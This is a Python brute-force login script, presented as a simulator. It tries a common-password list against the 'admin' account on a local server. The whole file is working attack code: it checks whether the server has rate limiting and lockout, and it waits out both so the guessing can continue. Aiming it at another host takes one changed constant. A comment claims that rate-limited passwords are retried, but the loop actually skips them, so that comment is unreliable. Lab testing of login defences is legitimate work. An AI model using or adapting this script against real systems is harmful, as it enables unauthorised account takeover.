import requests
import time
from datetime import datetime

# Configuration
SERVER_URL = "http://127.0.0.1:5000"
TARGET_USERNAME = "admin"  # Change this to attack different accounts
PASSWORD_FILE = "passwords.txt"
DELAY_BETWEEN_ATTEMPTS = 0  # Seconds (set to 0 for maximum speed)

# Statistics
total_attempts = 0
successful_attempts = 0
failed_attempts = 0
locked_attempts = 0
rate_limited_attempts = 0
start_time = None

def load_passwords(filename):
    """Load password list from file"""
    try:
        with open(filename, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"❌ Error: {filename} not found!")
        print("Creating sample password file...")
        
        # Create default password list
        default_passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "iloveyou", "trustno1", "1234567890",
            "sunshine", "master", "welcome", "shadow", "ashley",
            "football", "jesus", "monkey", "ninja", "mustang",
            "password123", "letmein", "abc123", "admin", "qwerty123"
        ]
        
        with open(filename, 'w') as f:
            f.write('\n'.join(default_passwords))
        
        print(f"✅ Created {filename} with {len(default_passwords)} common passwords")
        return default_passwords

def attempt_login(username, password):
    """Attempt to login with given credentials"""
    global total_attempts, successful_attempts, failed_attempts, locked_attempts, rate_limited_attempts
    
    total_attempts += 1
    
    try:
        response = requests.post(
            f"{SERVER_URL}/login",
            json={"username": username, "password": password},
            timeout=5
        )
        
        if response.status_code == 200:
            successful_attempts += 1
            return "SUCCESS"
        elif response.status_code == 403:
            locked_attempts += 1
            return "LOCKED"
        elif response.status_code == 429:
            rate_limited_attempts += 1
            return "RATE_LIMITED"
        else:
            failed_attempts += 1
            return "FAILED"
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Connection error: {e}")
        return "ERROR"

def print_statistics():
    """Print attack statistics"""
    elapsed = time.time() - start_time
    print("\n" + "=" * 60)
    print("📊 ATTACK STATISTICS")
    print("=" * 60)
    print(f"Total Attempts:        {total_attempts}")
    print(f"✅ Successful:         {successful_attempts}")
    print(f"❌ Failed:             {failed_attempts}")
    print(f"🔒 Locked:             {locked_attempts}")
    print(f"⏱️  Rate Limited:       {rate_limited_attempts}")
    print(f"⏱️  Time Elapsed:       {elapsed:.2f} seconds")
    if total_attempts > 0:
        print(f"📈 Attempts/Second:    {total_attempts/elapsed:.2f}")
    print("=" * 60 + "\n")

def run_attack():
    """Execute brute force attack"""
    global start_time
    
    print("=" * 60)
    print("⚔️  BRUTE-FORCE ATTACK SIMULATOR")
    print("=" * 60)
    print(f"Target: {TARGET_USERNAME}")
    print(f"Server: {SERVER_URL}")
    print(f"Delay: {DELAY_BETWEEN_ATTEMPTS}s between attempts")
    print("=" * 60 + "\n")
    
    # Check if server is running
    try:
        response = requests.get(f"{SERVER_URL}/")
        server_info = response.json()
        print("🎯 Server Status:")
        print(f"   Rate Limiting: {'✅ ENABLED' if server_info['security_features']['rate_limiting'] else '❌ DISABLED'}")
        print(f"   Account Lockout: {'✅ ENABLED' if server_info['security_features']['account_lockout'] else '❌ DISABLED'}")
        print()
    except requests.exceptions.RequestException:
        print("❌ Error: Cannot connect to server!")
        print("Make sure server.py is running on port 5000")
        return
    
    # Load passwords
    passwords = load_passwords(PASSWORD_FILE)
    print(f"📋 Loaded {len(passwords)} passwords from {PASSWORD_FILE}\n")
    print("🚀 Starting attack...\n")
    
    start_time = time.time()
    
    # Attempt each password
    for i, password in enumerate(passwords, 1):
        result = attempt_login(TARGET_USERNAME, password)
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if result == "SUCCESS":
            print(f"🎉 [{timestamp}] SUCCESS! Password found: '{password}' (attempt #{total_attempts})")
            print_statistics()
            return
        elif result == "LOCKED":
            print(f"🔒 [{timestamp}] Account locked! Waiting...")
            time.sleep(5)  # Wait before retrying
        elif result == "RATE_LIMITED":
            print(f"⏱️  [{timestamp}] Rate limited! Waiting 60 seconds for reset...")
            time.sleep(60)  # Wait full minute for rate limit window to reset
            print(f"⏱️  [{timestamp}] Resuming attack after rate limit cooldown...")
            # Don't skip this password - the loop will retry it automatically
        else:
            if i % 10 == 0:  # Print progress every 10 attempts
                print(f"⚔️  [{timestamp}] Attempt #{total_attempts}: '{password}' - {result}")
        
        if DELAY_BETWEEN_ATTEMPTS > 0:
            time.sleep(DELAY_BETWEEN_ATTEMPTS)
    
    # Attack finished without success
    print(f"\n❌ Attack failed! Password not found in list.")
    print_statistics()

if __name__ == '__main__':
    try:
        run_attack()
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user!")
        print_statistics()